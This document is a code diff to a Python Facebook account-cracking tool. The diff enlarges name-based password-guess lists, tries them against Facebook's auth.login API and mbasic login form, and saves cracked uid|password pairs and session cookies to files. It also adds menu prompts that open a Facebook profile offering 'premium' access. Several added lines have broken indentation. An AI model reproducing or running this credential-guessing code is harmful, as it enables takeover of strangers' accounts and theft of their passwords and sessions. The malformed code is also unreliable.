@@ -183,22 +183,49 @@ def menu():
 		else:
 			menu()
 	elif Bilal == "5" or Bilal == "05":
-		setting_ua()
+		    setting_ua()
 	elif Bilal == "6" or Bilal == "06":
-			setting_ua()
+			print("\n\033[1;37m[\033[1;31m1\033[1;37m] Contact tool admin for [\033[1;31mpremium\033[1;31m] request ")
+		print("\033[1;37m[\033[1;31m2\033[1;37m] Subscribe to \033[1;37m[\033[1;31mpremium\033[1;37m] \033[1;32mCP")
+		cek = raw_input("\n\033[1;37m[\033[1;31m+\033[1;37m]  \033[1;33mChoose : ")
+		if cek =="":
+	    os.system('xdg-open https://www.facebook.com/lizzy.moses.7739')
 	elif Bilal == "7" or Bilal == "07":
-			setting_ua()
+			print("\n\033[1;37m[\033[1;31m1\033[1;37m] Contact tool admin for [\033[1;31mpremium\033[1;31m] request ")
+		print("\033[1;37m[\033[1;31m2\033[1;37m] Subscribe to \033[1;37m[\033[1;31mpremium\033[1;37m] \033[1;32mCP")
+		cek = raw_input("\n\033[1;37m[\033[1;31m+\033[1;37m]  \033[1;33mChoose : ")
+		if cek =="":
+	    os.system('xdg-open https://www.facebook.com/lizzy.moses.7739')
 	elif Bilal == "8" or Bilal == "08":
-			setting_ua()
-		
+			print("\n\033[1;37m[\033[1;31m1\033[1;37m] Contact tool admin for [\033[1;31mpremium\033[1;31m] request ")
+		print("\033[1;37m[\033[1;31m2\033[1;37m] Subscribe to \033[1;37m[\033[1;31mpremium\033[1;37m] \033[1;32mCP")
+		cek = raw_input("\n\033[1;37m[\033[1;31m+\033[1;37m]  \033[1;33mChoose : ")
+		if cek =="":
+	    os.system('xdg-open https://www.facebook.com/lizzy.moses.7739')
         elif Bilal == "9" or Bilal == "09":
-			setting_ua()
+			print("\n\033[1;37m[\033[1;31m1\033[1;37m] Contact tool admin for [\033[1;31mpremium\033[1;31m] request ")
+		print("\033[1;37m[\033[1;31m2\033[1;37m] Subscribe to \033[1;37m[\033[1;31mpremium\033[1;37m] \033[1;32mCP")
+		cek = raw_input("\n\033[1;37m[\033[1;31m+\033[1;37m]  \033[1;33mChoose : ")
+		if cek =="":
+	    os.system('xdg-open https://www.facebook.com/lizzy.moses.7739')
 	elif Bilal == "10" or Bilal == "10":
-			setting_ua()
+			print("\n\033[1;37m[\033[1;31m1\033[1;37m] Contact tool admin for [\033[1;31mpremium\033[1;31m] request ")
+		print("\033[1;37m[\033[1;31m2\033[1;37m] Subscribe to \033[1;37m[\033[1;31mpremium\033[1;37m] \033[1;32mCP")
+		cek = raw_input("\n\033[1;37m[\033[1;31m+\033[1;37m]  \033[1;33mChoose : ")
+		if cek =="":
+	    os.system('xdg-open https://www.facebook.com/lizzy.moses.7739')
 	elif Bilal == "11" or Bilal == "11":
-			setting_ua()
+			print("\n\033[1;37m[\033[1;31m1\033[1;37m] Contact tool admin for [\033[1;31mpremium\033[1;31m] request ")
+		print("\033[1;37m[\033[1;31m2\033[1;37m] Subscribe to \033[1;37m[\033[1;31mpremium\033[1;37m] \033[1;32mCP")
+		cek = raw_input("\n\033[1;37m[\033[1;31m+\033[1;37m]  \033[1;33mChoose : ")
+		if cek =="":
+	    os.system('xdg-open https://www.facebook.com/lizzy.moses.7739')
 	elif Bilal == "12" or Bilal == "12":
-			setting_ua()
+			print("\n\033[1;37m[\033[1;31m1\033[1;37m] Contact tool admin for [\033[1;31mpremium\033[1;31m] request ")
+		print("\033[1;37m[\033[1;31m2\033[1;37m] Subscribe to \033[1;37m[\033[1;31mpremium\033[1;37m] \033[1;32mCP")
+		cek = raw_input("\n\033[1;37m[\033[1;31m+\033[1;37m]  \033[1;33mChoose : ")
+		if cek =="":
+	    os.system('xdg-open https://www.facebook.com/lizzy.moses.7739')
 	elif Bilal == "0" or Bilal == "00":
 		os.system("rm -f login.txt")
 		exit("\n\033[1;37m[\033[1;32m!\033[1;37m] Token removed")
@@ -317,17 +344,13 @@ def bapi(user):
 	); sys.stdout.flush()
 	uid, name = user.split("<=>")
 	if len(name)>=6:
-		pwx = [ name, name+"1", name+"12", name+"123", name+"1234", name+"12345" ]
+		pwx = [ name, name+"1", name+"12", name+"123", name+"1234", name+"12345", name, name+"11", name+"22", name+"33", name+"44", name+"55", name+"66", name+"77", name+"88", name+"99" ]
 	elif len(name)<=2:
-		pwx = [ name, name+"1", name+"12", name+"123", name+"1234", name+"12345" ]
+		pwx = [ name, name+"1", name+"12", name+"123", name+"1234", name+"12345", name+"2", name+"3", name+"4", name+"5", name+"6", name+"7", name+"8", name+"9", name+"9", name+"10", name+"16", name+"20", name+"13" ]
 	elif len(name)<=3:
-		pwx = [ 668844, name+"111", name+"222", name+"333", name+"444", name+"555", name+"666", name+"777", name+"888", name+"999" ]
-	elif len(name)<4:
-		pwx = [ name, name+"2004", name+"2003", name+"2001", name+"2002", name+"2000" ]
-	elif len(name)<5:
-		pwx = [ "786786", "000786", "000123", "000456", "000789", "000678", "457625", "67893", "998833" ]
+		pwx = [ name, name+"111", name+"222", name+"333", name+"444", name+"555", name+"666", name+"777", name+"888", name+"999" ]
 	else:
-		pwx = [ "112233", "123456", "102030", "223344", "445566", "556677", "778899", "468903", "780325" ]
+		pwx = [ name, name+"2001", name+"2002", name+"2003", name+"1999", name+"1998", name+"1997", name+"1996", name+"1995", name+"1994", name+"1993" ]
 		
 	try:
 		for pw in pwx:
@@ -336,13 +359,13 @@ def bapi(user):
 			headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
 			send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
 			if "session_key" in send.text and "EAAA" in send.text:
-				print("\r\033[1;97m[FUEGO-OK] %s|%s|%s\033[1;92m"%(uid, pw, send.json()[""]))
+				print("\r\033[1;92m[FUEGO-OK] %s|%s|%s\033[1;92m"%(uid, pw, send.json()[""]))
 				ok.append("%s|%s"%(uid, pw))
 				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
 				continue
 			elif "www.facebook.com" in send.json()["error_msg"]:
-				print("\r\033[1;97m[FUEGO-CP] %s|%s\033[1;92m        "%(uid, pw))
+				print("\r\033[1;93m[FUEGO-CP] %s|%s"%(uid, pw))
 				cp.append("%s|%s"%(uid, pw))
 				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
@@ -388,13 +411,13 @@ def mbasic(user):
 			gaaa = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
 			if "c_user" in ses.cookies.get_dict().keys():
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print("\r\033[0;97m[FUEGO-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
+				print("\r\033[0;92m[FUEGO-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
 				ok.append("%s|%s"%(uid, pw))
 				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
 				continue
 			elif "checkpoint" in ses.cookies.get_dict().keys():
-				print("\r\033[0;97m[FUEGO-CP] %s|%s\033[0;97m"%(uid, pw))
+				print("\r\033[0;93m[FUEGO-CP] %s|%s\033[0;97m"%(uid, pw))
 				cp.append("%s|%s"%(uid, pw))
 				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break 
